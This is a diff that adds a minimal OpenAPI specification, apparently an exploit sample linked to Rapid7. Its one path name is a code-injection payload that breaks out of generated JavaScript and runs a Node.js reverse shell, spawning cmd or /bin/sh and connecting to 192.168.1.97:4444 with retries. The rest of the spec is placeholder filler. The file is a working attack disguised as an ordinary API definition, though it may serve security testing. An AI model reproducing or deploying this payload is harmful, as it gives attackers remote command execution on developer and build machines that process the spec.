@@ -1,0 +1,63 @@
+{
+  "openapi": "3.0.0",
+  "servers": [
+    {
+      "url": "http://localhost/"
+    }
+  ],
+  "info": {
+    "description": "A",
+    "version": "1.0.0",
+    "title": "C",
+    "contact": {
+      "name": "Rapid 7",
+      "url": "https://www.rapid7.com/",
+      "email": "info@rapid7.com"
+    },
+    "license": {
+      "name": "BSD-3-clause",
+      "url": "https://opensource.org/licenses/BSD-3-Clause"
+    }
+  },
+  "tags": [
+    {
+      "name": "default"
+    }
+  ],
+  "paths": {
+    "/a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \"192.168.1.97\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5.0*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array('": {
+      "summary": "an example path",
+      "get": {
+        "operationId": "get_a",
+        "tags": ["default"],
+        "description": "D",
+        "responses": {
+          "200": {
+            "description": "E",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/d"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "d": {
+        "type": "object",
+        "description": "F",
+        "properties": {
+          "id": {
+            "type": "integer",
+            "format": "int64"
+          }
+        }
+      }
+    }
+  }
+}
